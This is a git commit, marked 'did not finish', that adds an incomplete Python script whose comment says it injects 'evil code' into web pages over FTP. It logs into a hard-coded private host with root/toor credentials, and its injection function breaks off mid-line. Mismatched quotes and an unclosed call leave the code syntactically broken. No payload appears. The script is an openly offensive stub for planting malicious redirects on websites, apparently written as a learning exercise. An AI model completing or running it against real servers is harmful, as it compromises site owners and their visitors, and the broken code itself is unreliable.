1dbad4ad9c64863c972298bba9e4842c688fa481
minyun168 <minyun168@outlook.com>
2018-09-23 01:41:06 +0800

    did not finish

---
+++ Excellent_python/part4_ftpscan.py
@@ -0,0 +1,17 @@
+#this script for injecting evil code to web page
+
+import ftplib
+
+def injectpage(ftp,page,redirect):
+	f=open(
+
+
+
+
+host='192.168.1.123"
+username= "root"
+password="toor"
+ftp=ftplib.FTP(host)
+ftp.login(username,password)
+
+redirect
